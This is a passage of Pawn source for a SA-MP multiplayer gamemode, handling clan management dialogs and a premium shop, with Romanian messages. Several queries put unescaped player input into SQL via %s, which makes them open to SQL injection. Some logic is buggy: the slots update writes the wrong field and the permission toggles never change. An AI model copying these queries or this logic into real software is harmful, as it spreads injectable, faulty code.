						SetPlayerName(userID, PlayerInfo[userID][pUsername]);
				    }
				    else format(gString, 128, "{%s}[CLAN] %s l-a dat pe %s (neconectat) afara.", ClanInfo[clanid][clColor], GetName(playerid), Selected[playerid][i]);
				    SendClanMessage(clanid, gString);
					ClanMembers[PlayerInfo[playerid][pClan]] --;
					mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Clan`='0', `ClanRank`='0', `ClanDays`='0', `ClanWarns`='0' WHERE `name`='%s'", Selected[playerid][i]);
					mysql_tquery(SQL, gQuery);
			    }
			    case 1: {
			    	if(PlayerInfo[playerid][pClanAccess][2] != 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai accesul necesar pentru a putea face asta.");
					format(gString, 128, "Ce rank vrei sa ii acorzi membrului %s?\nScrie un rank valid (1-6).", Selected[playerid][i]);
					ShowPlayerDialog(playerid, DIALOG_CLAN_GRANK, DIALOG_STYLE_INPUT, "Give rank", gString, "Ok", "Back");
			    }
				case 2: {
					if(PlayerInfo[playerid][pClanAccess][0] != 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai accesul necesar pentru a putea face asta.");
					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", Selected[playerid][i]);
					mysql_tquery(SQL, gQuery, "SQL_QUERY_CLAN", "iiii", playerid, i, clanid, 0);
				}
				case 3: {
					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", Selected[playerid][i]);
					mysql_tquery(SQL, gQuery, "SQL_QUERY_CLAN", "iiii", playerid, i, clanid, 1);
				} 
				case 4: {
					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", Selected[playerid][i]);
					mysql_tquery(SQL, gQuery, "SQL_QUERY_CLAN", "iiii", playerid, i, clanid, 2);
				} 
				case 5: {
					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", Selected[playerid][i]);
					mysql_tquery(SQL, gQuery, "SQL_QUERY_CLAN", "iiii", playerid, i, clanid, 3);
				} 
			}
		}		
		case DIALOG_CLAN_ACCESS: {
			if(!response) return true;
			new clanid = PlayerInfo[playerid][pClan], i = listitemm[playerid], userID=SelectedPlayers[playerid][i];
			strmid(sName[playerid], Selected[playerid][i], 0, MAX_PLAYER_NAME);
			switch(listitem) {
				case 0: {
					new accese[3];
					cache_get_value_name(i, "ClanAccess", gQuery),			sscanf(gQuery, "a<i>[3]", accese);
					if(userID != -1) {
						if(PlayerInfo[userID][pClanAccess][0]==1) PlayerInfo[userID][pClanAccess][0] = 1;
						else PlayerInfo[userID][pClanAccess][0] = 0;
						format(gString, 128, "{%s}[CLAN] %s i-a modificat permisiunile lui %s (online). [rank: %s, clan warns: %s, uninvite: %s].", 
						ClanInfo[clanid][clColor], GetName(playerid), Selected[playerid][i], 
						PlayerInfo[userID][pClanAccess][0]?"true":"false",
						PlayerInfo[userID][pClanAccess][1]?"true":"false",
						PlayerInfo[userID][pClanAccess][2]?"true":"false");
					}
					else format(gString, 128, "{%s}[CLAN] %s i-a modificat permisiunile lui %s (offline). [rank: %s, clan warns: %s, uninvite: %s].", 
					ClanInfo[clanid][clColor], GetName(playerid), Selected[playerid][i],
					PlayerInfo[userID][pClanAccess][0]?"true":"false",
					PlayerInfo[userID][pClanAccess][1]?"true":"false",
					PlayerInfo[userID][pClanAccess][2]?"true":"false");
				    SendClanMessage(clanid, gString);
					mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `ClanAccess`='%d %d %d' WHERE `name`='%s'", accese[0], accese[1], accese[2], Selected[playerid][i]);
					mysql_tquery(SQL, gQuery);
				}
				case 1: {
					new accese[3];
					cache_get_value_name(i, "ClanAccess", gQuery),			sscanf(gQuery, "a<i>[3]", accese);
					if(userID != -1) {
						if(PlayerInfo[userID][pClanAccess][1]==1) PlayerInfo[userID][pClanAccess][1] = 1;
						else PlayerInfo[userID][pClanAccess][1] = 0;
						format(gString, 128, "{%s}[CLAN] %s i-a modificat permisiunile lui %s (online). [rank: %s, clan warns: %s, uninvite: %s].", 
						ClanInfo[clanid][clColor], GetName(playerid), Selected[playerid][i], 
						PlayerInfo[userID][pClanAccess][0]?"true":"false",
						PlayerInfo[userID][pClanAccess][1]?"true":"false",
						PlayerInfo[userID][pClanAccess][2]?"true":"false");
					}
					else format(gString, 128, "{%s}[CLAN] %s i-a modificat permisiunile lui %s (offline). [rank: %s, clan warns: %s, uninvite: %s].", 
					ClanInfo[clanid][clColor], GetName(playerid), Selected[playerid][i],
					PlayerInfo[userID][pClanAccess][0]?"true":"false",
					PlayerInfo[userID][pClanAccess][1]?"true":"false",
					PlayerInfo[userID][pClanAccess][2]?"true":"false");
				    SendClanMessage(clanid, gString);
					mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `ClanAccess`='%d %d %d' WHERE `name`='%s'", accese[0], accese[1], accese[2], Selected[playerid][i]);
					mysql_tquery(SQL, gQuery);
				}
				case 2: {
					new accese[3];
					cache_get_value_name(i, "ClanAccess", gQuery),			sscanf(gQuery, "a<i>[3]", accese);
					if(userID != -1) {
						if(PlayerInfo[userID][pClanAccess][2]==1) PlayerInfo[userID][pClanAccess][2] = 1;
						else PlayerInfo[userID][pClanAccess][2] = 0;
						format(gString, 128, "{%s}[CLAN] %s i-a modificat permisiunile lui %s (online). [rank: %s, clan warns: %s, uninvite: %s].", 
						ClanInfo[clanid][clColor], GetName(playerid), Selected[playerid][i], 
						PlayerInfo[userID][pClanAccess][0]?"true":"false",
						PlayerInfo[userID][pClanAccess][1]?"true":"false",
						PlayerInfo[userID][pClanAccess][2]?"true":"false");
					}
					else format(gString, 128, "{%s}[CLAN] %s i-a modificat permisiunile lui %s (offline). [rank: %s, clan warns: %s, uninvite: %s].", 
					ClanInfo[clanid][clColor], GetName(playerid), Selected[playerid][i],
					PlayerInfo[userID][pClanAccess][0]?"true":"false",
					PlayerInfo[userID][pClanAccess][1]?"true":"false",
					PlayerInfo[userID][pClanAccess][2]?"true":"false");
				    SendClanMessage(clanid, gString);
					mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `ClanAccess`='%d %d %d' WHERE `name`='%s'", accese[0], accese[1], accese[2], Selected[playerid][i]);
					mysql_tquery(SQL, gQuery);
				}
			}
		}
		case DIALOG_CLAN_GRANK: {	
			if !response *then 
				return true;

			if strval(inputtext) <= 0 || strval(inputtext) > 6 *then 
				return SendClientMessage(playerid, COLOR_GREY, "Rank-ul este invalid. Trebuie sa fie cuprins intre 1 si 6!");


		    mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", sName[playerid]);
		    mysql_tquery(SQL, gQuery, #check_clan_grank, #iis, playerid, PlayerInfo[playerid][pClan], inputtext);
		}
		case DIALOG_CLAN: {
			if(!response) return ShowShop(playerid);
			mysql_format(SQL, gQuery, 180, "SELECT * FROM `clans` WHERE `Name`='%s'", inputtext);
			mysql_tquery(SQL, gQuery, "sql_exist_name", "is", playerid, inputtext);
		}
		case DIALOG_CLAN2: {
			if(!response) {
				SendClientMessage(playerid, COLOR_WHITE, "Tagul clanului trebuie sa aiba intre 3 si 6 caractere.");
				format(gString, 128, "Numele ales de tine este: %s.\nCel de-al doilea pas, este de a alege tagul clanului.\nTagul clanului trebuie sa contina intre 3 si 9 caractere.", ClanInfo[PlayerInfo[playerid][pClan]][clName]);
				ShowPlayerDialog(playerid, DIALOG_CLAN2, DIALOG_STYLE_INPUT, "Shop:", gString, "Ok", "");			
				return true;
			}
			if(!ValidClanTag(inputtext)) {
				SendClientMessage(playerid, COLOR_GREY, "Tagul trebuie sa contina [ ] sau .");
				format(gString, 128, "Numele ales de tine este: %s.\nCel de-al doilea pas, este de a alege tagul clanului.\nTagul clanului trebuie sa contina intre 3 si 9 caractere.", ClanInfo[PlayerInfo[playerid][pClan]][clName]);
				ShowPlayerDialog(playerid, DIALOG_CLAN2, DIALOG_STYLE_INPUT, "Shop:", gString, "Ok", "");					
				return true;
			}	
			if(InvalidClanTag(inputtext)) {
				SendClientMessage(playerid, COLOR_GREY, "Tagul trebuie sa contina [ ] sau .");
				format(gString, 128, "Numele ales de tine este: %s.\nCel de-al doilea pas, este de a alege tagul clanului.\nTagul clanului trebuie sa contina intre 3 si 9 caractere.", ClanInfo[PlayerInfo[playerid][pClan]][clName]);
				ShowPlayerDialog(playerid, DIALOG_CLAN2, DIALOG_STYLE_INPUT, "Shop:", gString, "Ok", "");					
				return true;
			}		
			mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `clans` WHERE `Tag` = '%s' LIMIT 1", inputtext);	
			mysql_tquery(SQL, gQuery, #check_clan_tag, #is, playerid, inputtext);
		}
		case DIALOG_CLAN_SETTINGS:
		{
		    if(!response) return ShowPlayerDialog(playerid, DIALOG_CLAN_COMMAND, DIALOG_STYLE_LIST, "{F4AD42}Clan {FFFFFF}Menu", "Members\nClan TAG\nVehicles\nSafebox\nSettings", "Select", "Close");
			if(PlayerInfo[playerid][pClanRank] < 6) return true;
			new clanid = PlayerInfo[playerid][pClan];
		    switch(listitem) {
			    case 0: ShowPlayerDialog(playerid, DIALOG_CLAN_COLOR, DIALOG_STYLE_INPUT, "Change color", "Scrie mai jos culoarea clanului. (EX: FFFFFF - ALB)\nSite recomandat: http://www.colorpicker.com/", "Select", "Back");
			    case 1: ShowPlayerDialog(playerid, DIALOG_CLAN_MOTD, DIALOG_STYLE_INPUT, "Change MOTD", "Introdu textul pe care vrei sa-l pui la MOTD.", "Select", "Back");
			    case 2: ShowPlayerDialog(playerid, DIALOG_CLAN_RANK, DIALOG_STYLE_INPUT, "Change rank name", "Introdu numele pe care vrei sa-l pui la rankuri.", "Select", "Back");
				case 3: {
					if(ClanInfo[clanid][clPremiumPoints] < 200) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					ShowPlayerDialog(playerid, DIALOG_CHANGETAG, DIALOG_STYLE_INPUT, "Change TAG", "Introdu mai jos numele pe care doresti sa-l aiba tagul clanului:", "Select", "Back");
				}
				case 4: {
					if(ClanInfo[clanid][clPremiumPoints] < 200) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					ShowPlayerDialog(playerid, DIALOG_CLANNAME, DIALOG_STYLE_INPUT, "Change Name", "Introdu mai jos numele pe care doresti sa-l aiba numele clanului:", "Select", "Back");
				}
				case 5: {
					if(ClanInfo[clanid][clPremiumPoints] < 50) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de 50 premium points in clan pentru aceasta optiune.");
					if(ClanInfo[clanid][clVip]!=1&&ClanInfo[clanid][clSlots] >= 90) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti avea mai mult de 90 sloturi in clan!");
					else if(ClanInfo[clanid][clVip]==1&&ClanInfo[clanid][clSlots] >= 120) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti avea mai mult de 120 sloturi in clan!");
					ClanInfo[clanid][clPremiumPoints] -= 50;
					ClanInfo[clanid][clSlots] += 30;
					mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `Slots`='%i', `PremiumPoints` = '%i' WHERE `ID`='%i'", ClanInfo[clanid][clDays], ClanInfo[clanid][clPremiumPoints], clanid);
					mysql_tquery(SQL, gQuery, "", "");
					SCMf(playerid, COLOR_LGREEN, "Clan slots updated to %d/%d. (-50 premium points)", ClanInfo[clanid][clSlots], ClanInfo[clanid][clVip]?120:90);
				}
				case 6: {
					if(ClanInfo[clanid][ClanBank] < 10000000) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de $5.000.000 pentru aceasta optiune.");
					ClanInfo[clanid][ClanBank] -= 10000000;
					ClanInfo[clanid][clDays] ++;
					mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `Days`='%i' WHERE `ID`='%i'", ClanInfo[clanid][clDays], clanid);
					mysql_tquery(SQL, gQuery, "", "");
					SCMf(playerid, COLOR_MONEY, "Ai marit zilele clanului cu o zi pentru $10.000.000. Clanul tau va expira peste %d zile.", ClanInfo[clanid][clDays]);
				}
				case 7: {
					if(ClanInfo[clanid][clVip]!=1&&ClanInfo[clanid][clBonus]>=5)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Clanul tau detine deja 50%% procent la bonus!");
					else if(ClanInfo[clanid][clVip]==1&&ClanInfo[clanid][clBonus]>=10)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Clanul tau detine deja 100%% procent la bonus!");

					if(ClanInfo[clanid][clPremiumPoints] < 1000)
						return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de 1000 premium points in clan pentru aceasta optiune.");

					ClanInfo[clanid][clPremiumPoints] -= 1000;
					++ClanInfo[clanid][clBonus];
					mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `clans` SET `Bonus`='%i', `PremiumPoints` = '%i' WHERE `ID`='%i'", ClanInfo[clanid][clBonus], ClanInfo[clanid][clPremiumPoints], clanid);
					mysql_tquery(SQL, gQuery, "", "");					
					SCMf(playerid, COLOR_MONEY, "(Clan): {FFFFFF}Ai cumparat 10%% bonus la castigul clanului pentru 1000 puncte premium. Total procent: %d%%", ClanInfo[clanid][clBonus] * 10);
				}
				case 8: {
					if(ClanInfo[clanid][clPremiumPoints] < 1500)
						return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points (in safe) to do this.", "Close", "");
					if(ClanInfo[clanid][clPremium]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest clan este deja unul de tip premium!");

					ShowPlayerDialog(playerid, DIALOG_CLAN_PREMIUM, DIALOG_STYLE_MSGBOX, "Clan Premium", "Avantaje:\n\
					- Poti detine pana la 20 vehicule in clan;\n\
					- Poti spawna pana la 12 vehicule ale clanului;\n\n\
					Esti sigur ca vrei sa platesti 1500 puncte premium pentru aceasta optiune?",
					"Da", "Nu");
				}
				case 9: {
					if(ClanInfo[clanid][clPremiumPoints] < 3000)
						return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points (in safe) to do this.", "Close", "");
					if(ClanInfo[clanid][clVip]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest clan este deja unul de tip vip!");

					ShowPlayerDialog(playerid, DIALOG_CLAN_VIP, DIALOG_STYLE_MSGBOX, "Clan VIP", "Avantaje:\n\
					- Poti detine pana la 100%% job boost la clan;\n\
					- Poti avea 120 de membrii;",
					"Da", "Nu");
				}
			}
		}
		case DIALOG_CLAN_PREMIUM: {
			if(!response) return true;
			new clanid = PlayerInfo[playerid][pClan];

			SendClientMessage(playerid, COLOR_YELLOW, "Felicitari, clanul tau este acum unul premium! (-1500 premium points)");
			ClanInfo[clanid][clPremium] = 1;
			ClanInfo[clanid][clPremiumPoints] -= 1500;
			mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `Premium`='%i' WHERE `ID`='%i'", ClanInfo[clanid][clPremium], clanid);
			mysql_tquery(SQL, gQuery, "", "");
		}
		case DIALOG_CLAN_VIP: {
			if(!response) return true;
			new clanid = PlayerInfo[playerid][pClan];

			SendClientMessage(playerid, COLOR_YELLOW, "Felicitari, clanul tau este acum unul VIP! (-3000 premium points)");
			ClanInfo[clanid][clVip] = 1;
			ClanInfo[clanid][clPremiumPoints] -= 3000;
			mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `VIP`='%i' WHERE `ID`='%i'", ClanInfo[clanid][clVip], clanid);
			mysql_tquery(SQL, gQuery, "", "");
		}
		case DIALOG_CLANNAME: {
			if(!response) return true;
			mysql_format(SQL, gQuery, 180, "SELECT * FROM `clans` WHERE `Name`='%s'", inputtext);
			mysql_tquery(SQL, gQuery, "sql_exist_name", "is", playerid, inputtext);		
		}
		case DIALOG_CHANGETAG: {
			if(!response) return true;
			mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `clans` WHERE `Tag` = '%s' LIMIT 1", inputtext);
			mysql_tquery(SQL, gQuery, #check_tag_clan, #is, playerid, inputtext);
		}		
		case DIALOG_CLAN_COLOR:
		{
            new clanid = PlayerInfo[playerid][pClan];
		    if(!response) return ShowPlayerDialog(playerid, DIALOG_CLAN_SETTINGS, DIALOG_STYLE_LIST, "{F4AD42}Clan {FFFFFF}Setting", "Change color\nChange MOTD\nChange rank names\nChange Tag {FFFF00}(50 premium points)\nChange Name {FFFF00}(200 premium points)\n+30 Clan slots {FFFF00}(50 premium points)\nClan Days {4dad2b}($5.000.000/days)\nClan bonus procent - current: 10%%/50%% {FFFF00}(1000 premium points / 10%%)", "Select", "Back");
            if(strlen(inputtext) <= 0 || strlen(inputtext) > 6) return  ShowPlayerDialog(playerid, DIALOG_CLAN_SETTINGS, DIALOG_STYLE_LIST, "Setari:", "Schimba culoarea\nSchimba MOTD-ul\nSchimba numele rankurilor\n{FFCC00}(620 PP){FFFFFF} Schimba numele clanului\n{FFCC00}(310 PP){FFFFFF} Schimba tagul clanului\n{FFCC00}(720PP){FFFFFF} +30 Clan days", "Select", "Back");
            format(ClanInfo[clanid][clColor], 32, inputtext);
			format(gString, 128, "{%s}[CLAN] %s a schimbat culoarea la clan.", ClanInfo[clanid][clColor], GetName(playerid), inputtext);
			SendClanMessage(clanid, gString);
			new color[11];
			strmid(color, inputtext, 0, 8);
			strcat(color, "AA", 11);
			ClanInfo[clanid][clColorInt] = HexToInt(color);
			for(new i = 1; i <= SQL_clanzone; i++) {
			    if(GraffitiInfo[i][gfOwned] == PlayerInfo[playerid][pClan]) {
					DestroyDynamicObject(GraffitiInfo[i][gfObject]);
					GraffitiInfo[i][gfObject] = CreateDynamicObject(19353, GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfZ], GraffitiInfo[i][gfRotX], GraffitiInfo[i][gfRotY], GraffitiInfo[i][gfRotZ]);
					format(gString, 128, "{%s}%s\n%s", ClanInfo[GraffitiInfo[i][gfOwned]][clColor], ClanInfo[GraffitiInfo[i][gfOwned]][clName], ClanInfo[GraffitiInfo[i][gfOwned]][clTag]);
				    SetDynamicObjectMaterialText(GraffitiInfo[i][gfObject], 0, gString, OBJECT_MATERIAL_SIZE_512x256, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
			    }
			}
			foreach(new dbid: MyVehicle<PlayerInfo[playerid][pClan]+MAX_PLAYERS>) {
				if(!CarInfo[dbid][Spawned]) continue;
				if(nameobject[CarInfo[dbid][Spawned]]!=INVALID_OBJECT_ID) DestroyDynamicObject(nameobject[CarInfo[dbid][Spawned]]), nameobject[CarInfo[dbid][Spawned]] = INVALID_OBJECT_ID;
				nameobject[CarInfo[dbid][Spawned]] = CreateDynamicObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
				format(gString, 128, "{%s}%s\n%s", ClanInfo[clanid][clColor], ClanInfo[clanid][clName], ClanInfo[clanid][clTag]);
				SetDynamicObjectMaterialText(nameobject[CarInfo[dbid][Spawned]], 0, gString, OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1);
				switch(CarInfo[dbid][cModel]) {
					case 560: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.001281, -0.031064, 0.799423, 270.000000, -72.499961, -72.619377);
					case 411: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.007179, -1.809922, 0.345012, 270.000000, 0.000000, -0.227281);
					case 495: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.001114, -0.575842, 1.019607, -93.500038, -176.600158, -537.750976);
					case 579: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.061755, -0.397705, 1.229994, 270.000000, 78.100013, 78.464035);
					case 482: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.005479, -0.440506, 0.923802, -93.100189, 0.000000, -0.626388);
					case 480: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.010557, -1.580164, 0.269652, 270.000000, 0.000000, -359.608337);
					case 494, 502, 503: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.011076, -0.593440, 0.721932, -90.200088, 0.000000, -0.698576);
					case 409: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.006276, -0.418243, 0.790085, -90.000083, 0.000000, -0.756195);
					case 541: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.009455, -0.219650, 0.610000, 270.000000, 2.599999, -357.916931);
					case 556: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], -0.022844, -1.879892, 1.081047, -90.799919, 0.000000, -0.391171);
					case 522: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.280631, 0.179313, 0.131688, 5.299997, 0.000000, -269.768890);
					case 487: AttachDynamicObjectToVehicle(nameobject[CarInfo[dbid][Spawned]], CarInfo[dbid][Spawned], 0.655894, -1.564441, 0.499657, 0.000000, 0.000000, -289.959808);
				}
			}
			if(ClanInfo[clanid][clHQ] > 0) UpdateLabel(4, ClanInfo[clanid][clHQ]);
			mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `Color`='%s' WHERE `ID`='%d'", ClanInfo[clanid][clColor], clanid);
            mysql_tquery(SQL, gQuery, "", "");
		}
		case DIALOG_CLAN_MOTD:
		{
		    if(!response) return ShowPlayerDialog(playerid, DIALOG_CLAN_SETTINGS, DIALOG_STYLE_LIST, "{F4AD42}Clan {FFFFFF}Setting", "Change color\nChange MOTD\nChange rank names\nChange Tag {FFFF00}(50 premium points)\nChange Name {FFFF00}(200 premium points)\n+30 Clan slots {FFFF00}(50 premium points)\nClan Days {4dad2b}($5.000.000/days)\nClan bonus procent - current: 10%%/50%% {FFFF00}(1000 premium points / 10%%)", "Select", "Back");
		    new clanid = PlayerInfo[playerid][pClan];
			format(gString, 256, "{%s}[CLAN] %s a schimbat MOTD clan in %s.", ClanInfo[clanid][clColor], GetName(playerid), inputtext);
			SendClanMessage(clanid, gString);

		    format(ClanInfo[clanid][clMotd], 32, "%s", inputtext);
			mysql_format(SQL, gQuery, 256, "UPDATE `clans` SET `Motd`='%s' WHERE `ID`='%d'", ClanInfo[clanid][clMotd], clanid);
            mysql_tquery(SQL, gQuery);
        }
		case DIALOG_CLAN_RANK: {
		    if(!response) return ShowPlayerDialog(playerid, DIALOG_CLAN_SETTINGS, DIALOG_STYLE_LIST, "{F4AD42}Clan {FFFFFF}Setting", "Change color\nChange MOTD\nChange rank names\nChange Tag {FFFF00}(50 premium points)\nChange Name {FFFF00}(200 premium points)\n+30 Clan slots {FFFF00}(50 premium points)\nClan Days {4dad2b}($5.000.000/days)\nClan bonus procent - current: 10%%/50%% {FFFF00}(1000 premium points / 10%%)", "Select", "Back");
			format(szRank[playerid], 32, inputtext);
			ShowPlayerDialog(playerid, DIALOG_CLAN_RANK2, DIALOG_STYLE_LIST, "Selecteaza rank-ul:", "Rank 1\nRank 2\nRank 3\nRank 4\nRank 5\nRank 6\nRank 7", "Schimba", "Back");
		}
		case DIALOG_CLAN_RANK2:
		{
		    if(!response) return ShowPlayerDialog(playerid, DIALOG_CLAN_RANK, DIALOG_STYLE_INPUT, "Setarile clanului:", "{FFFFFF}Introdu numele pe care vrei sa-l pui la rankuri.", "Select", "Back");
		    new clanid = PlayerInfo[playerid][pClan];
			format(ClanInfo[clanid][clRankName1 + clInfo:(listitem*32)], 32, "%s", szRank[playerid]);
			mysql_format(SQL, gQuery, 180, "UPDATE `clans` SET `RankName%i`='%s' WHERE `ID`='%i'", listitem+1, szRank[playerid], clanid);
		    mysql_tquery(SQL, gQuery);
			format(gString, 128, "{%s}[CLAN] %s a schimbat name rank %d in %s.", ClanInfo[clanid][clColor], GetName(playerid), listitem+1, szRank[playerid]);
			SendClanMessage(clanid, gString);
		}
		case DIALOG_SHOPMENU: {
			if(!response) return true;
			ShopType[playerid] = listitem;
			ShowShop(playerid);
		}
		case DIALOG_SHOP: {
			gString[0] = (EOS);
			if(!response) {
				ShopType[playerid] = 0;
				gString[0] = (EOS);
				format(gString, sizeof(gString), "Shop Type\tItem\n{FFEA3B}[+] Shop Info{FFFFFF}\nNormal Shop\t20 items\nVip Cars\t11 items\nExtra Packs\t3 items\nCustom House Ticket\t{%s}5000 premium points\n{FFFFFF}Account upgrade\t10 item", PlayerInfo[playerid][pPremiumPoints]<5000?"98ff5c":"ff5c5c");
				ShowPlayerDialog(playerid, DIALOG_SHOPMENU, DIALOG_STYLE_TABLIST_HEADERS, "Shop Menu", gString, "Select", "Cancel");
				return true;
			}
			switch(ShopType[playerid]) {
				case 0: {
					gString[0] = (EOS);
					format(gString, sizeof(gString), "Shop Type\tItem\n{FFEA3B}[+] Shop Info{FFFFFF}\nNormal Shop\t20 items\nVip Cars\t11 items\nExtra Packs\t3 items\nCustom House Ticket\t{%s}5000 premium points\n{FFFFFF}Account upgrade\t10 item", PlayerInfo[playerid][pPremiumPoints]<5000?"98ff5c":"ff5c5c");
					ShowPlayerDialog(playerid, DIALOG_SHOPMENU, DIALOG_STYLE_TABLIST_HEADERS, "Shop Menu", gString, "Select", "Cancel");
				}
				case 1: {
					switch(listitem) {
						case 0: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un clan? (300 puncte premium)\nBeneficii:\n- Poti invita pana la 30 playeri si este disponibil pentru 30 zile. (se poate configura)", "Ok", "Back");
						case 1: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa stergi 10 FP-uri? (30 puncte premium)", "Ok", "Back");	
						case 2: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa-ti schimbi numele? (200 puncte premium)", "Ok", "Back");
						case 3: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm","Esti sigur ca vrei sa iti achizitionezi un hidden color? (40 puncte premium)", "Ok", "Back");
						case 4: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un slot in garaj? (40 puncte premium)", "Ok", "Back");
						case 5: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un clear 1 warn? (150 puncte premium)", "Ok", "Back");
						case 6: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un MP3? (40 puncte premium)", "Ok", "Back");
						case 7: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un iPhone? (100 puncte premium)", "Ok", "Back");
						case 8: {
							new bouse = PlayerInfo[playerid][pHouse];
							if(bouse != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) {
								if(HouseInfo[PlayerInfo[playerid][pHouse]][hRadio] == 1) return SendClientMessage(playerid, -1, "Aceasta afacere are deja un radio!");
								ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa-ti achizitionezi radio in casa? (55 puncte premium)", "Ok", "Back");
							}
							else return SendClientMessage(playerid, COLOR_GREY, "Nu ai o casa!");
						}
						case 9: {
							if(PlayerInfo[playerid][pBizz] == 255) return SendClientMessage(playerid, -1, "Nu ai o afacere!");
							if(BizzInfo[PlayerInfo[playerid][pBizz]][bRadio] == 1) return SendClientMessage(playerid, -1, "Aceasta afacere are deja un radio!");				
							ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa-ti achizitionezi radio in afacere? (55 puncte premium)\n\nBeneficii:\n- Cu ajutorul acestui voucher il poti vinde prin (/trade) altor jucatori.", "Ok", "Back");
						}
						case 10: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un 1x Rare Voucher (50 PP)? (55 puncte premium)", "Ok", "Back");
						case 11: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un 1x Epic Voucher (100 PP)? (110 puncte premium)", "Ok", "Back");
						case 12: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un 1x Legendary Voucher (500 PP)? (525 puncte premium)", "Ok", "Back");
